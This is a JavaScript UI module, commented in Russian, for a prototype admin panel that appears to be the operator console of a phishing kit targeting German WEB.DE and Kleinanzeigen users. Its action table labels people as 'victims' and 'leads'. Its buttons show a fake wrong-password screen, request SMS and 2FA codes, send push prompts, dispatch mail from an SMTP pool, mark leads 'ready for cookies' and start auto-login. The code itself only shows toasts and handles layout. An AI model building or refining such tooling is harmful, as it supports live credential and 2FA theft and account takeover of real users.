// modules/actions.js — обработчики для всех "живых" кнопок прототипа:
// action-grid у лида, copy-btn, загрузки файлов, send и т.д. Каждое действие
// показывает toast — чтобы прототип выглядел как настоящая работающая админка.

import { toast } from './toast.js';

const ACTION_TOASTS = {
  Error:    { level: 'error',   title: 'Ошибка отмечена',         sub: 'Лиду виден экран «Falsches Passwort»' },
  Push:     { level: 'info',    title: 'Отправлен PUSH',          sub: 'Жертва увидит запрос на устройстве' },
  SMS:      { level: 'info',    title: 'Запрошен SMS-код',        sub: 'Лиду отправлено сообщение' },
  '2-FA':   { level: 'info',    title: 'Запрошен 2FA-код',        sub: 'Ожидание ввода 6 цифр от лида' },
  Wait:     { level: 'info',    title: 'Жертва переведена в Wait', sub: 'Спиннер · скрипт ждёт следующего действия' },
  'E-Mail': { level: 'success', title: 'Config E-Mail отправлен', sub: 'Письмо ушло из SMTP-пула' },
  Kl:       { level: 'info',    title: 'Klein-flow запущен',      sub: 'Перевод на сценарий Kleinanzeigen' },
  Успех:    { level: 'success', title: 'Лид помечен Успех',       sub: 'Перенесён в зелёные · готов для cookies' },
  Скрыть:   { level: 'success', title: 'Лид скрыт',               sub: 'Перенесён в архив, можно вернуть' },
  // Совместимость со старыми лейблами
  Success:   { level: 'success', title: 'Лид помечен Успех' },
  Отработан: { level: 'success', title: 'Лид скрыт', sub: 'Перенесён в архив' },
};

// Action-grid у лида
document.querySelectorAll('.lead-actions .act-btn, .act-btn').forEach((btn) => {
  btn.addEventListener('click', () => {
    const label = (btn.textContent || '').trim();
    if (!label) return;
    document.querySelectorAll('.act-btn.active').forEach((x) => {
      if (x !== btn && !x.classList.contains('muted')) x.classList.remove('active');
    });
    if (!btn.classList.contains('muted')) btn.classList.add('active');
    const t = ACTION_TOASTS[label];
    if (t) toast[t.level](t.title, t.sub);
    else toast.info(label, 'Действие выполнено');
  });
});

// Кнопки-копирования: ⎘ → текст из соседнего .field-value или из data-copy
document.querySelectorAll('.copy-btn').forEach((btn) => {
  btn.addEventListener('click', async (e) => {
    e.preventDefault();
    let txt = btn.getAttribute('data-copy');
    if (!txt) {
      const valEl = btn.parentElement && btn.parentElement.querySelector('.field-value, .field-status-online');
      txt = valEl ? (valEl.textContent || '').trim() : '';
    }
    try {
      if (txt) await navigator.clipboard.writeText(txt);
      btn.style.color = 'var(--success)';
      setTimeout(() => (btn.style.color = ''), 900);
      toast.success('Скопировано', txt ? txt.slice(0, 60) : '—');
    } catch (_) {
      toast.error('Не удалось скопировать');
    }
  });
});

// Кнопка "Отправить" в превью E-Mail
document.querySelectorAll('#email-test-send, .email-preview-actions .btn-primary').forEach((btn) => {
  btn.addEventListener('click', () => {
    const to = (document.getElementById('email-test-to') || {}).value || 'kunde@web.de';
    toast.success('Тестовое письмо отправлено', `→ ${to}`);
  });
});

// Загрузка файлов (label/input file): show "загружено: имя"
document.querySelectorAll('input[type="file"]').forEach((inp) => {
  inp.addEventListener('change', () => {
    const f = inp.files && inp.files[0];
    if (!f) return;
    toast.success('Файл загружен', `${f.name} · ${Math.round(f.size / 1024)} KB`);
  });
});

// "Автовход" — крупная кнопка в шапке лида
document.querySelectorAll('.btn-autovhod, .lead-detail-actions .btn-primary').forEach((btn) => {
  btn.addEventListener('click', () => {
    toast.info('Автовход запущен', 'Открыт slot · ждём подтверждения push');
  });
});

// Rail-кнопки целиком обрабатывает modules/rail-panel.js

// Удаление в шапке профиля E-Mail
document.querySelectorAll('[title="Удалить"]').forEach((btn) => {
  btn.addEventListener('click', () => toast.warning('Профиль удалён', 'Можно отменить из бекапа за 7 дней'));
});
document.querySelectorAll('[title="Новый профиль"], [title="Создать профиль"]').forEach((btn) => {
  btn.addEventListener('click', () => toast.success('Новый профиль создан', 'WEB.DE · без названия'));
});
document.querySelectorAll('[title="Переименовать"]').forEach((btn) => {
  btn.addEventListener('click', () => toast.info('Переименовать', 'Кликни по названию профиля чтобы отредактировать'));
});

// Дрэг хэндла левого списка лидов — пользователь меняет ширину сайдбара.
(function () {
  const grid = document.getElementById('body');
  const handle = document.getElementById('list-pane-resizer');
  if (!grid || !handle) return;
  let startX = 0;
  let startW = 0;
  const minW = 220;
  const maxW = () => Math.min(640, Math.floor(window.innerWidth * 0.45));
  function onMove(e) {
    const dx = e.clientX - startX;
    let next = startW + dx;
    if (next < minW) next = minW;
    const m = maxW();
    if (next > m) next = m;
    grid.style.setProperty('--list-w', next + 'px');
  }
  function onUp() {
    handle.classList.remove('is-dragging');
    document.body.classList.remove('is-list-resizing');
    window.removeEventListener('mousemove', onMove);
    window.removeEventListener('mouseup', onUp);
    try { localStorage.setItem('list-w', grid.style.getPropertyValue('--list-w')); } catch (_) {}
  }
  handle.addEventListener('mousedown', (e) => {
    e.preventDefault();
    startX = e.clientX;
    const cur = parseFloat(getComputedStyle(grid).getPropertyValue('--list-w')) || 304;
    startW = cur;
    handle.classList.add('is-dragging');
    document.body.classList.add('is-list-resizing');
    window.addEventListener('mousemove', onMove);
    window.addEventListener('mouseup', onUp);
  });
  handle.addEventListener('dblclick', () => {
    grid.style.removeProperty('--list-w');
    try { localStorage.removeItem('list-w'); } catch (_) {}
  });
  try {
    const saved = localStorage.getItem('list-w');
    if (saved) grid.style.setProperty('--list-w', saved);
  } catch (_) {}
})();

// Дрэг хэндла action-strip — пользователь поднимает/опускает панель кнопок.
(function () {
  const strip = document.getElementById('action-strip');
  const handle = document.getElementById('action-strip-resizer');
  if (!strip || !handle) return;
  let startY = 0;
  let startH = 0;
  const minH = 80;
  const maxH = () => Math.floor(window.innerHeight * 0.7);
  function onMove(e) {
    const dy = e.clientY - startY;
    // двигаешь хэндл вверх → панель выше; вниз → меньше
    let next = startH - dy;
    if (next < minH) next = minH;
    const m = maxH();
    if (next > m) next = m;
    strip.style.setProperty('--action-strip-h', next + 'px');
  }
  function onUp() {
    handle.classList.remove('is-dragging');
    document.body.classList.remove('is-action-resizing');
    window.removeEventListener('mousemove', onMove);
    window.removeEventListener('mouseup', onUp);
    try { localStorage.setItem('action-strip-h', strip.style.getPropertyValue('--action-strip-h')); } catch (_) {}
  }
  handle.addEventListener('mousedown', (e) => {
    e.preventDefault();
    startY = e.clientY;
    startH = strip.getBoundingClientRect().height;
    handle.classList.add('is-dragging');
    document.body.classList.add('is-action-resizing');
    window.addEventListener('mousemove', onMove);
    window.addEventListener('mouseup', onUp);
  });
  handle.addEventListener('dblclick', () => {
    strip.style.removeProperty('--action-strip-h');
    try { localStorage.removeItem('action-strip-h'); } catch (_) {}
  });
  try {
    const saved = localStorage.getItem('action-strip-h');
    if (saved) strip.style.setProperty('--action-strip-h', saved);
  } catch (_) {}
})();
